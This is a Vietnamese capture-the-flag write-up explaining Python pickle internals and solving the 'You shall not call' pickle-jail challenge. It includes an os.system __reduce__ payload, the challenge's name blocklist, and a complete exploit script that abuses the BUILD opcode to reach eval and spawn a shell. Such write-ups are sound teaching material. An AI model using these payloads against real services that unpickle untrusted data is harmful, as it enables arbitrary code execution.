---
title: "The journy deep down to the pickle machine"
description: "The journy deep down to the pickle machine"
summary: "The journy deep down to the pickle machine"
categories: ["Writeup"]
tags: ["Misc"]
#externalUrl: ""
date: 2023-04-27
draft: false
authors:
  - Shin24
---

Vừa rồi trong giải Imaginary CTF 2023, mình đã tham gia cùng team nhưng không đóng góp được nhiều, do các bài web đầu khá dễ nên hầu như ai cũng làm được, dẫn đến điểm giảm còn 100, bài `amongus` thì dù mình đã tìm ra hướng đúng nhưng xử lý sót nên payload đã không hoạt động, sau khi đọc writeup và nhận ra sai lầm thì mình đã khá cay :))) 

Ngoài ra mình có attemp 1 (hoặc có thể là 2) challenge nữa là `You shall not call`, đây là một bài pyjail khá hay và khó, sau khi nghía qua script giải thì mình nhận ra được hướng của bài và bắt đầu ngồi tự giải lại. Sau đây mình sẽ nói về pickle và writeup lại quá trình giải bài này

## Python Pickle
### Introduction
Như ta đã biết thì để truyền các dữ liệu phức tạp như object hay array thì ta sẽ phải serialize nó sang một dạng có thể truyền tải và lưu trữ được. Nếu cảm thấy khó hiểu thì thật ra JSON cũng là một dạng của serialization, trong JS thì `JSON.stringify` là serialize và `JSON.parse` là deserialize ( quá trình ngược lại của serialize)

Trong python thì pickle chính là thư viện native của python phục vụ việc serialize các kiểu dữ liệu như object hay array
### Pickle structure
Pickle sử dụng một Pickle Machine để serialize/deserialize data, bao gồm 3 phần là parser, stack và memo:
- Parser là phần sẽ xử lý các opcodes và call tới dispatcher ứng với opcode đó
![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/50305ca6-74b7-41e7-83bb-5bc1e1d6b130)

- Stack thì như cái tên của nó, đóng vai trò là bộ nhớ ngắn hạn
- Memo đóng vai trò là một bộ nhớ dài hạn hơn, được implement bằng một python dict 
![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/cb022605-2621-4472-af61-cc73a1466c71)


Tại source code của [python](https://github.com/python/cpython/blob/26e08dfdd7ac1b3d567d30cd35e4898121580390/Lib/pickle.py#L4) ta có thể thấy các opcodes được khai báo ở phía trên 
![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/30244449-3ec9-4778-af52-110a781e3c12)


Các opcodes này cho phép ta thao tác với nhiều kiểu dữ liệu khác nhau như list, tuple, dict, objects, strings, int, ... thao tác với stack và memo. Ngoài ra nó còn cho phép ta import các modules, ghi thuộc tính vào các object

### What could go wrong
Nếu bạn là một web player thì hẳn đã gặp qua pickle khi tìm hiểu insecure deserialization, nhưng liệu bạn đã hiểu về quá trình deserialization của pickle chưa? Cùng nhìn vào một ví dụ

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/8aef1388-c512-4108-bfaa-6583dba1c3e0)


`__reduce__` là một magic method trong python, nó được dùng để nói cho python biết các để reconstruct object đó, cần một ví dụ khác :

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/00e5ae2f-b049-4446-abf8-930cfa38f8fa)


`copy` cũng sử dụng magic method này để biết các reconstruct lại object.

Quay lại vấn đề, nếu bạn thử in kết quả từ `pickle.dumps` ta sẽ có một bytestream khá khó hiểu

```
\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.
```

Ta sẽ dùng một thư viện có sẵn khác để hỗ trợ việc đọc hiểu bytestream này, đó là `pickletools`:

```py 
import pickle, os, pickletools

class Evil(object):
    def __reduce__(self):
        return (os.system,("id",))

e = Evil()
pickletools.dis(pickle.dumps(e))
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/21b084ec-41fd-4777-86bb-9da529e17e44)


Opcode đầu tiên là `PROTO` được đánh dấu bằng ký tự `\x80`, đây là opcode dùng để khai báo version được sử dụng của pickle protocol, cao nhất là 5, version càng cao thì các opcode mà nó hỗ trợ càng nhiều. Opcode `MEMOIZE` dùng để đưa value ở top của stack vào memo (không có gì đặc biệt nên từ giờ ta sẽ bỏ qua nó), SHORT_BINUNICODE thì đơn giản là dùng để khai báo một unicode string và đưa giá trị vào stack
![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/356a190a-cdc5-4868-adcf-6a6b9a0526db)

`STACK_GLOBAL` là opcode đặc biệt, dùng để load một attribute bất kì từ 1 module và đưa vào top stack, với tên module cũng như tên attribute được lấy từ stack, trong trường hợp này tương đương với `from posix import system`

Tiếp theo ta thấy nó chứa chuỗi `id` vào top stack, sau đó dùng opcode `TUPLE1` để tạo 1 tuple 1 phần tử, cuối cùng là opcode `REDUCE`, dùng để gọi một callable object (function) với arguments là tuple ở đỉnh stack, giờ thì ta biết lý do tại sao payload lại là `(os.system,("id",))` rùi, arguments của callable bắt buộc phải là 1 tuple

Một điều hay nữa là ta có để rút gọn payload ở trên đi rất nhiều: `cposix\nsystem\nS'id'\x85R`
![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5c0617d0-8f39-4617-af6d-03780c112b53)

Thay vì dùng `STACK_GLOBAL` thì ta có thể dùng opcode GLOBAL để load trực tiếp attribute mà không cần thông qua stack, sau đó push `id` vào stack bằng opcode `STRING` (khai báo 1 string) rồi dùng REDUCE để gọi `posix.system('id')`, opcode `.` (`STOP`) luôn nằm ở cuối để kết thúc quá trình deserialization

Cách mà mình tìm hiểu pickle là bằng việc đọc source code của nó, source code khá dễ đọc nên bạn có thể truy cập vào link source mình để khi nãy và tìm hiểu thêm về nó nhé

## The challenge
![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/744b9ca8-5e0d-4946-aee3-3cf56f26cff1)

Source code: https://imaginaryctf.org/r/DvMPf#server.py

Mình sẽ để source ở đây phòng khi tương lai file này bị gỡ
```py 
import __main__
import pickle
import io

# Security measure -- forbid calls
for op in ['reduce', 'inst', 'obj', 'newobj', 'newobj_ex']: #pickle.REDUCE, pickle.INST, pickle.OBJ, pickle.NEWOBJ, pickle.NEWOBJ_EX]:
    id = getattr(pickle, op.upper())[0]
    delattr(pickle._Unpickler, pickle._Unpickler.dispatch[id].__name__)
    pickle._Unpickler.dispatch[id] = lambda _: print("Stop right there, you heineous criminal!") or exit()

# Security measure -- remove dangerous class and method
del pickle.Unpickler
del pickle._Unpickler.find_class

# Security measure -- overload unpickler with an actually secure class
class SecureUnpickler(pickle._Unpickler):
    def find_class(self, _: str, name: str) -> object:
        # Security measure -- prevent access to dangerous elements
        for x in ['exe', 'os', 'break', 'set', 'eva', 'help', 'sys', 'load', 'open', 'dis']:
            if x in name:
                print("Smuggling contraband in broad daylight?! Guards!")
                break
        # Security measure -- only the main module is a valid lookup target
        else:
            return getattr(__main__, name)

# Security measure -- remove dangerous magic
for k in list(globals()):
    if '_' in k and k not in ['__main__', '__builtins__']:
        del globals()[k]

# Security measure -- remove dangerous magic
__builtins__ = { k: getattr(__builtins__, k) for k in dir(__builtins__) if '_' not in k }

# My jail is very secure!
data = io.BytesIO(bytes.fromhex(input('$ ')))
SecureUnpickler(data).load()
```
Yêu cầu đơn giản là đọc file flag ở trên server

### Analyzing

Đầu tiên ta thấy một số opcodes bị ghi đè

```py
for op in ['reduce', 'inst', 'obj', 'newobj', 'newobj_ex']: #pickle.REDUCE, pickle.INST, pickle.OBJ, pickle.NEWOBJ, pickle.NEWOBJ_EX]:
    id = getattr(pickle, op.upper())[0]
    delattr(pickle._Unpickler, pickle._Unpickler.dispatch[id].__name__)
    pickle._Unpickler.dispatch[id] = lambda _: print("Stop right there, you heineous criminal!") or exit()
```

Ta sẽ không thể gọi các opcodes này nữa, các opcodes này đều là các opcodes quan trọng trong việc call function, như ở description ta cũng có thể thấy, các function calling opcodes sẽ bị chặn

tiếp theo là xóa class `Unpickler` và method `_Unpickler.find_class`

```py
del pickle.Unpickler
del pickle._Unpickler.find_class
```

Tạo class `SecureUnpickler` kế thừa `pickle._Unpickler` và ghi đè method `find_class` nhằm chặn việc load một số attribute bằng opcode `GLOBAL`, `find_class` là method được gọi để tìm attribute trong modules mà `GLOBAL` và `STACK_GLOBAL` gọi, nghĩa là mỗi khi muốn load một attribute nào đó (như `os.system`) thì đều phải đi qua filter này

```py
for x in ['exe', 'os', 'break', 'set', 'eva', 'help', 'sys', 'load', 'open', 'dis']:
            if x in name:
                print("Smuggling contraband in broad daylight?! Guards!")
                break
```

Tiếp theo là xóa các attribute có `_` trong tên ngoại trừ `__main__` và `__builtins__`

```py 
for k in list(globals()):
    if '_' in k and k not in ['__main__', '__builtins__']:
        del globals()[k]
```

module `__builtins__` chứa các builtin function cũng bị ghi đè và chỉ chừa lại các attribute không có `_` trong tên

```py
__builtins__ = { k: getattr(__builtins__, k) for k in dir(__builtins__) if '_' not in k }
```

Data nhận vào ở dạng hex và được unpickle (deserialize)

```py
data = io.BytesIO(bytes.fromhex(input('$ ')))
SecureUnpickler(data).load()
```

### Let's the game begin

Vấn đề đầu tiên ta gặp phải là việc có 5 opcode quan trọng bị xóa, dẫn đến việc ta không thể call function được. Vào [source code](https://github.com/python/cpython/blob/26e08dfdd7ac1b3d567d30cd35e4898121580390/Lib/pickle.py#L4) tìm đến class `_Unpickler` để tìm opcode thay thế

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/4c8d7c5c-f5cf-499a-b915-aced3b4b21a1)

Sau một hồi đọc có thể thầy là không còn opcode nào khác có thể call được function, tuy nhiên tại dispatcher của opcode `BUILD` ta thấy một dòng đoạn code khá thú vị

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/cf0b329d-bf55-47c9-bb5a-181a0f412736)

Tại đây sẽ check xem nếu object có method `__setstate__` thì sẽ call đến method này với tham số là state, điều quan trọng là ta đều có thể kiểm soát được cả 2 data này, nhưng state thì dễ hiểu nhưng làm sao để kiểm soát`__setstate__`?

Nếu nhìn xuống phần code bên dưới nữa ta sẽ thấy opcode này có thể được dùng để gán các thuộc tính tùy ý cho object

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/c6dc6c1e-3d44-4711-b7c3-367846d6dab7)

Vậy ý tưởng là tìm cách ghi `__setstate__` thành một method bất kì muốn gọi tới (tất nhiên là method đó chỉ có thể có 1 arg). Giờ thì ta cần tìm một method, nếu để ý kỹ thì hàm `find_class` của challenge chỉ có phép ta lấy attribute từ `__main__`, mà các hàm builtins thì nằm trong `__builtins__`, vậy làm sao để lấy được các attribute này đây?

Sau vài lần thử mình phát hiện ra `__main__` có 1 attribute khác là `__main__` trỏ đến chính nó, vậy sẽ ra sao nếu ta thử dùng dùng `GLOBAL` để lấy `__main__` và `__builtins__`, sau đó dùng opcode `BUILD` để ghi đè `__main__` thành chính `__builtins__`? Cùng thử nhé, thay vì craft payload bằng tay (như trước nay mình vẫn làm @@) thì nay mình biết được pwntools có hỗ trợ gen opcodes cho pickle

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/61fe8702-8ccb-42cd-840e-1968ca966818)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/538852ca-b6f4-4761-9e87-2d84a83701d5)


Đầu tiên là load `__builtins__` rồi lưu vào memo, sau đó load `__main__` rồi tạo một tuple 2 phần tử (mục đích là để `__builtins__ ` được set thông qua `setattr`, nó sẽ an toàn hơn là set trực tiếp, các bạn đọc source code dispatcher của BUILD nha)

Đưa payload cho server và print `__main__`ra để debug

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2684e6d4-c808-44b8-a57b-109a6e01522a)

Thử `print(__main__.items())` ta sẽ thấy các builtin functions

**fact nhỏ**:

> Khi bạn dùng `dir(__builtins__)` và `__builtins__.__dir__()` thì kết quả sẽ khác nhau, vì nếu `__builtins__` là list thì `dir()` sẽ trả về các **phần tử của list** đó, còn khi gọi `__builtins__.__dir__()` thì là đang gọi đến chính method `__dir__` của class List (`__builtins__` là list chứa các builtin methods) nên nó sẽ trả về các thuộc tính/methods của object List


Bây giờ ta đã ghi đè `__main__` và mang các builtin methods ra nơi có thể "với" tới, tiếp theo ta sẽ thử ghi đè hàm `print` vào `__setstate__`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/628251b7-27b6-44e4-895f-b54e0402d862)

Lưu ý là vì ban đầu lúc push `__main__` thì ta chưa pop ra nên tại dòng số 26 khi build thì object được dùng sẽ là chính `__main__`, opcode `BUILD` ở dòng 26 là để trigger payload sau khi đã ghi đè `__setstate__`, `called` chính là `state`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/fbf89832-2e1e-4328-b246-8a83b7ee2641)

Lúc này ta đã gọi được `print("called")`, nhưng ta không thể gọi `eval` hay `exec` gì được vì đã filter tại `find_class`

### Overwrite the world

Nếu ta có thể overwrite được `__setstate__`, vậy liệu ta có thể overwrite được `find_class` của `SecureUnpickler` không? Nếu vậy ta sẽ overwrite nó bằng cái gì? Đó chính là method `get` của `__builtins__`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/8f5c22e2-1edf-4ecb-9168-37e988bf23f2)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9b2288d5-6c33-4b58-9ea5-a61b56b64162)

Method này sẽ cho phép ta lấy attribute từ 1 dict, mỗi khi `GLOBAL` dispatcher trong `_Unpickler` được gọi thì nó sẽ dùng method này để tìm đến `attribute` trong modules tương ứng và đưa vào stack

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/1d3b43ba-cb7f-487a-b92e-2eae3d45bd61)

Oke vậy tất cả mảnh ghép đã có đủ, flow cuối cùng sẽ như sau:
- Lấy method `get` của `__builtins__` để ghi đè `find_class` của `SecureUnpickler`
- Ghi đè `__setattr__` của `__main__` thành `eval`
- Trigger `__setstate__` với `state` là code python để chạy eval

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/21464992-11cf-401f-9ad7-579f5f2b37bb)

Phần này mình không giải thích kỹ để các bạn có thể tự giải và hiểu hơn về pickle

Đây là script giải để các bạn tham khảo
```py 
from pwn import *
import pickletools


data = pickle.PROTO + bytes([5])

data += pickle.GLOBAL + b"__main__\n__main__\n"
data += pickle.BINPUT + bytes([1]) # save __main__ to memo[1]
data += pickle.POP

data += pickle.GLOBAL + b"__main__\nSecureUnpickler\n" 
data += pickle.BINPUT + bytes([2]) # save SecureUnpickler to memo[2]
data += pickle.POP

data += pickle.GLOBAL + b"__main__\n__main__\n"

data += pickle.MARK
data += pickle.STRING + b"'__main__'\n"
data += pickle.GLOBAL + b"__main__\n__builtins__\n"
data += pickle.DICT
data += pickle.BUILD

data += pickle.GLOBAL + b"__main__\nget\n"
data += pickle.BINPUT + bytes([3]) # save get to memo[3]
data += pickle.POP

# SecureUnpickler.find_class = __builtins__.get
data += pickle.BINGET + bytes([2])
data += pickle.NONE
data += pickle.MARK
data += pickle.STRING + b"'find_class'\n"
data += pickle.BINGET + bytes([3])
data += pickle.DICT
data += pickle.TUPLE2
data += pickle.BUILD 

# __main__.__setstate__ = __builtins__.eval
data += pickle.BINGET + bytes([1])
data += pickle.NONE
data += pickle.MARK
data += pickle.STRING + b"'__setstate__'\n"
data += pickle.GLOBAL + b"eval\naaa\n"
data += pickle.DICT
data += pickle.TUPLE2
data += pickle.BUILD 
data += pickle.POP
data += pickle.POP

# trigger eval("'__import__(\"os\").system(\"sh\")'\n")
data += pickle.BINGET + bytes([1])
data += pickle.STRING + b"'__import__(\"os\").system(\"sh\")'\n"
data += pickle.BUILD
data += pickle.POP

data += pickle.STOP

from codecs import getencoder
pickletools.dis(data)
print(getencoder("hex")(data)[0].decode())

```
